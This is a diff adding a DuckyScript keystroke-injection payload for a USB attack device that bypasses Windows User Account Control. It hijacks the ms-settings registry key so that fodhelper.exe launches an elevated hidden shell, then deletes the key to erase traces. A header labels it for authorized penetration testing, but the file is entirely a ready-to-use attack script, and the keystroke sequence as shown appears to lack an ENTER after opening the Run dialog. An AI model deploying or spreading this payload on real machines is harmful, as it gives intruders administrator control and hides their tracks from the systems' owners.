@@ -1,0 +1,22 @@
+REM ============================================
+REM UAC Bypass - Fodhelper Method
+REM FOR AUTHORIZED PENETRATION TESTING ONLY
+REM ============================================
+REM Bypasses UAC by hijacking the Fodhelper executable
+
+DELAY 500
+GUI r
+DELAY 200
+STRING cmd
+DELAY 500
+
+STRING reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /t REG_SZ /d "powershell -WindowStyle Hidden -Command Start-Process cmd -Verb RunAs" /f
+ENTER
+DELAY 300
+
+STRING fodhelper.exe
+ENTER
+DELAY 1000
+
+STRING reg delete HKCU\Software\Classes\ms-settings /f
+ENTER
